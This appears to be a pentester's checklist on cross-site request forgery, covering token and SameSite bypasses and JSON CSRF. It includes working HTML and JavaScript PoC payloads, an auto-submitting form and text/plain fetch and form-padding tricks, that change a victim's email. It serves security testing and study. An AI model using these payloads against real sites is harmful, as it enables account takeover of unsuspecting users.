# Cross-Site Request Forgery

Cross-Site Request Forgery allows an attacker to perform an action on a victim's behalf without the victim knowing.

Can't steal any data, but can perform a state-changing action.

## Checks

- [ ] Look for:
  - State-changing action with no unique tokens
  - Check if we can replicate the request without triggering CORS
  - Develop a PoC.
- [ ] CSRF Tokens
  - Can we remove the token?
  - Can we remove the parameter altogether?
  - Is the token tied to the user's session?
  - Can the CSRF token be reused?
  - Can we determine how the CSRF token is generated, and can we break it?

Example:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <h3>Standard CSRF PoC</h3>
    <form action="<https://nnjftadt.eu1.ctfio.com/email>" method="post">
      <input type="hidden" name="email" value="pawpaw@hacks.dev" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF Bypasses

- [ ] Check switching CSRF tokens between users
- [ ] Try removing the token and/or parameter

## Escalate Self-XSS

If you have a self XSS that would require the victim to fill out a form, it may be possible to chain the self-XSS -> CSRF to develop a working exploit that has impact.

> [! tip] This is particularly relevant for POST requests that are vulnerable to XSS

## SameSite Cookie Bypasses

- [ ] Check the `SameSite` attribute on session cookies
  - `None` — cookie sent on all cross-site requests (requires `Secure` flag)
  - `Lax` — cookie sent on top-level navigations with safe methods (GET)
  - `Strict` — cookie never sent cross-site
- [ ] If `SameSite=Lax` (or default):
  - Can the state-changing action be performed via GET? (e.g., `GET /update-email?email=evil@hacker.com`)
  - Try method override: `POST` body with `_method=GET` parameter
- [ ] If `SameSite=None`, standard CSRF applies — check for missing CSRF token
- [ ] Check if there's a 2-minute window after OAuth/SSO login where `Lax` isn't enforced (Chrome behavior)

## JSON CSRF

If the endpoint expects `Content-Type: application/json`:

### Using fetch (if CORS allows it)

```html
<script>
  fetch("https://target.com/api/update", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({ email: "evil@hacker.com" }),
  });
</script>
```

> [!tip] `text/plain`, `application/x-www-form-urlencoded`, and `multipart/form-data` are "simple" content types that don't trigger a CORS preflight.

### Using form with padding

```html
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"evil@hacker.com","padding":"' value='"}' />
  <input type="submit" />
</form>
```

---

## References

- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
